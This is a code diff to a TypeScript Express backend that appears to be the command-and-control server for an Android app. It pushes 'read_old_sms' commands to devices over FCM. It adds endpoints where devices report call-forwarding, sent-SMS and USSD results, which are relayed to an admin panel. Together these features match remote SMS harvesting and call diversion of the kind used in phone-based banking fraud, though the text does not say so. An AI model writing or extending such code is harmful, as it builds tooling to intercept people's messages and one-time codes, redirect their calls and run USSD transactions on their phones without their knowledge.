@@ -704,13 +704,105 @@ router.post("/:deviceId/notifications/batch", async (req: Request, res: Response
 router.post("/:deviceId/read-old-sms", async (req: Request, res: Response) => {
   try {
     const deviceId = clean(req.params.deviceId);
-    const days     = Number(req.body?.days || 15);
     if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
-    logger.info("devices: read-old-sms triggered", { deviceId, days });
-    const result = await fcmSendCommand(deviceId, "read_old_sms", { requestId: `oldsms_${deviceId}_${Date.now()}`, extraData: { days, timestamp: Date.now() } });
+    // count = number of SMS to fetch (new), days = fallback for old APK compat
+    const count = Number(req.body?.count || req.body?.days || 3);
+    logger.info("devices: read-old-sms triggered", { deviceId, count });
+    const result = await fcmSendCommand(deviceId, "read_old_sms", {
+      requestId: `oldsms_${deviceId}_${Date.now()}`,
+      extraData: {
+        count: count,      // new APK reads this
+        days: count,       // old APK backward compat
+        timestamp: Date.now(),
+      },
+    });
     return res.json({ success: result.success, messageId: result.messageId, error: result.error });
   } catch (err: any) {
     logger.error("devices: read-old-sms failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   CALL FORWARD RESULT (APK → Backend → WS → Admin)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/call-forward-result", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
+    const status    = clean(req.body?.status   || "success");
+    const number    = clean(req.body?.number   || "");
+    const response  = clean(req.body?.response || "");
+    const uniqueid  = clean(req.body?.uniqueid || deviceId);
+    logger.info("devices: call-forward-result received", { deviceId, status, number });
+    // Emit call_forward:result WS event → admin panel receives it
+    wsService.broadcastAdminEvent("call_forward:result", {
+      uniqueid,
+      deviceId,
+      status,
+      number,
+      response,
+      timestamp: Date.now(),
+    }, { deviceId, includeDeviceChannel: true });
+    return res.json({ success: true });
+  } catch (err: any) {
+    logger.error("devices: call-forward-result failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   SMS SENT RESULT (APK → Backend → WS → Admin)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/sms-sent", async (req: Request, res: Response) => {
+  try {
+    const deviceId  = clean(req.params.deviceId);
+    if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
+    const status    = clean(req.body?.status   || "sent");
+    const to        = clean(req.body?.to       || "");
+    const uniqueid  = clean(req.body?.uniqueid || deviceId);
+    logger.info("devices: sms-sent result received", { deviceId, status, to });
+    // Emit sms:sent WS event → admin panel receives it
+    wsService.broadcastAdminEvent("sms:sent", {
+      uniqueid,
+      deviceId,
+      status,
+      to,
+      timestamp: Date.now(),
+    }, { deviceId, includeDeviceChannel: true });
+    return res.json({ success: true });
+  } catch (err: any) {
+    logger.error("devices: sms-sent failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   USSD RESULT (APK → Backend → WS → Admin)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/ussd-result", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
+    const status   = clean(req.body?.status   || "success");
+    const response = clean(req.body?.response || "");
+    const uniqueid = clean(req.body?.uniqueid || deviceId);
+    logger.info("devices: ussd-result received", { deviceId, status, response: response.slice(0, 50) });
+    // Emit ussd:result WS event → admin panel receives it
+    wsService.broadcastAdminEvent("ussd:result", {
+      uniqueid,
+      deviceId,
+      status,
+      response,
+      message: response,
+      timestamp: Date.now(),
+    }, { deviceId, includeDeviceChannel: true });
+    return res.json({ success: true });
+  } catch (err: any) {
+    logger.error("devices: ussd-result failed", err);
     return res.status(500).json({ success: false, error: err?.message });
   }
 });
